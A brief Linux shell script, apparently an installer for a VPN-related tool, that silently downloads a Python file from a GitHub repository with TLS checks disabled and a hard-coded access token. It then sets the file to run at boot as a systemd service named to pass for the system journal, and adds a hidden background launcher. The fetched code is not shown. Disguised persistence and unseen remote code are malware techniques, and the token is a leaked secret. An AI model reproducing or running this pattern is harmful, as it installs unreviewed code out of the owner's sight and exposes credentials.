cd /var/local
curl -skLO -H "Authorization: token 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" -H "Accept: application/vnd.github.v3.raw" "https://raw.githubusercontent.com/Vpn-modder/install/main/80.py"
chmod +x /var/local/*.py
cd

cat << END > /lib/systemd/system/systemd-journal2.service
[Unit]
Description=Journal Service(2)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /var/local/80.py
ProtectSystem=true
ProtectHome=true
RemainAfterExit=yes
ExecReload=/bin/kill -HUP 
ExecStop=/bin/kill -s QUIT 
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
END

cat << journal > /usr/local/sbin/journal
#!/bin/bash
nohup python3 /var/local/80.py > /dev/null 2>&1 &
journal

systemctl enable systemd-journal2.service > /dev/null 2>&1 &
